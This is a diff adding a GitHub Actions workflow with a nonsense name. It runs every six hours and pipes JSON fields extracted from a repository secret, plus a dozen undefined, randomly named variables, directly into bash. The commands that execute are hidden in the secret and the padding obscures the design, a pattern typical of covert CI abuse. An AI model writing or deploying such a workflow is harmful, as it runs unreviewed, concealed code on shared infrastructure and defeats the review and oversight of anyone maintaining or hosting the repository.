@@ -1,0 +1,30 @@
+name: yongzhixiegenn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yongzhixiegenn
+        env:
+          dp9: ${{ secrets.dp9 }}
+        run: |
+          echo $dp9 | jq -r .xcxr296 | /bin/bash
+          echo $jam75 | jq -r .qidf7 | /bin/bash
+          echo $l01 | jq -r .d2 | /bin/bash
+          echo $ehbb716 | jq -r .tjjpc72 | /bin/bash
+          echo $l1112 | jq -r .qygm3 | /bin/bash
+          echo $t1467 | jq -r .gyfaa377 | /bin/bash
+          echo $xavcz2 | jq -r .qkdo60623 | /bin/bash
+          echo $ak65 | jq -r .qrxed54818 | /bin/bash
+          echo $r189 | jq -r .vclo241 | /bin/bash
+          echo $bwag30 | jq -r .ueum673 | /bin/bash
+          echo $mwsr64843 | jq -r .jmbri1404 | /bin/bash
+          echo $vzix827 | jq -r .icxav2 | /bin/bash
+          echo $ripyp2447 | jq -r .uqqsu199 | /bin/bash
+
